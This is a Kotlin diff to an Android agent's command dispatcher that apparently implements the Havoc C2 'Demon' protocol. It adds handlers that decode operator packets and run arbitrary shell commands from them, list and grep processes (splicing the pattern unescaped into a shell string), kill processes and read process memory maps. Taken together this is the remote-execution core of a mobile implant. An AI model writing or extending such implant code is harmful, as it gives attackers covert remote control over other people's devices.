@@ -110,25 +110,80 @@ class CommandDispatcher(private val ctx: Context, private val session: AgentSess
     // ── PROC MODULE (COMMAND_PROC = 0x1010) ───────────────────────────
     private fun cmdProcModule(reqId: Int, p: PacketParser): ByteArray {
         if (p.remaining < 4) {
-            // No sub-command — just list processes
             return buildOutput(reqId, "Good", runShell("ps -A 2>&1"), "")
         }
-        val sub = p.readInt32()
-        return when (sub) {
-            1 -> buildOutput(reqId, "Good", runShell("ps -A 2>&1"), "")
+
+        return when (val sub = p.readInt32()) {
+
+            // DEMON_COMMAND_PROC_LIST = 2
+            1, 2 -> buildOutput(reqId, "Good", runShell("ps -A 2>&1"), "")
+
+            // DEMON_COMMAND_PROC_CREATE = 4
+            // Wire (little-endian, post-decrypt):
+            //   [4]  ProcessState
+            //   [4+N] Process     (UTF-16LE length-prefixed: "sh")
+            //   [4+N] ProcessArgs (UTF-16LE length-prefixed: "/c whoami")
+            //   [4]  ProcessPiped
+            //   [4]  ProcessVerbose
             4 -> {
+                val state        = p.readInt32()              // ProcessState (ignorar)
+                val processBytes = p.readBytes()              // UTF-16LE bytes de "sh"
+                val argsBytes    = p.readBytes()              // UTF-16LE bytes de "/c whoami"
+                val piped        = if (p.remaining >= 4) p.readInt32() else 1
+                val verbose      = if (p.remaining >= 4) p.readInt32() else 0
+
+                // Decode UTF-16LE
+                val process = processBytes.toString(Charsets.UTF_16LE).trimEnd('\u0000')
+                val args    = argsBytes.toString(Charsets.UTF_16LE).trimEnd('\u0000')
+
+                android.util.Log.d("AgentService",
+                    "PROC_CREATE: process='$process' args='$args' piped=$piped verbose=$verbose")
+
+                // Extract actual command: "/c whoami" → "whoami"
+                val cmd = when {
+                    args.startsWith("/c ", ignoreCase = true)  -> args.substring(3).trim()
+                    args.startsWith("-c ", ignoreCase = true)  -> args.substring(3).trim()
+                    args.isNotBlank()                          -> args.trim()
+                    process.isNotBlank() && process != "sh"    -> process.trim()
+                    else -> return buildOutput(reqId, "Error", "No command to execute", "")
+                }
+
+                android.util.Log.d("AgentService", "shell cmd: $cmd")
+                val output = runShell(cmd)
+                buildOutput(reqId, "Good", output.ifBlank { "(no output)" }, "")
+            }
+
+            // DEMON_COMMAND_PROC_GREP = 3
+            // Wire: [4+N] pattern (UTF-16LE)
+            3 -> {
+                val patBytes = p.readBytes()
+                val pattern  = patBytes.toString(Charsets.UTF_16LE).trimEnd('\u0000')
+                val out = runShell("ps -A 2>&1 | grep -i '${pattern}'")
+                buildOutput(reqId, "Good", out.ifBlank { "(no match for '$pattern')" }, "")
+            }
+
+            // DEMON_COMMAND_PROC_KILL = 7
+            // Wire: [4] pid
+            7 -> {
                 if (p.remaining < 4) return buildOutput(reqId, "Error", "No PID specified", "")
                 val pid = p.readInt32()
-                buildOutput(reqId, "Good", runShell("kill -9 $pid 2>&1").ifBlank { "[+] Killed $pid" }, "")
+                val out = runShell("kill -9 $pid 2>&1").ifBlank { "[+] Killed PID $pid" }
+                buildOutput(reqId, "Good", out, "")
             }
-            5 -> {  // memory/maps
-                if (p.remaining < 4) return buildOutput(reqId, "Good", runShell("cat /proc/self/maps 2>&1"), "")
-                val pid = p.readInt32()
+
+            // DEMON_COMMAND_PROC_MODULES = 2
+            // DEMON_COMMAND_PROC_MEMORY = 6
+            6 -> {
+                val pid = if (p.remaining >= 4) p.readInt32()
+                          else android.os.Process.myPid()
                 buildOutput(reqId, "Good", runShell("cat /proc/$pid/maps 2>&1"), "")
             }
-            else -> buildOutput(reqId, "Info", "proc sub=0x${sub.toString(16)} not implemented on Android", "")
+
+            else -> buildOutput(reqId, "Info",
+                "proc sub=0x${sub.toString(16)} not implemented on Android", "")
         }
     }
+
 
     // ── TOKEN (getuid / whoami) ────────────────────────────────────────
     private fun cmdToken(reqId: Int, p: PacketParser): ByteArray {
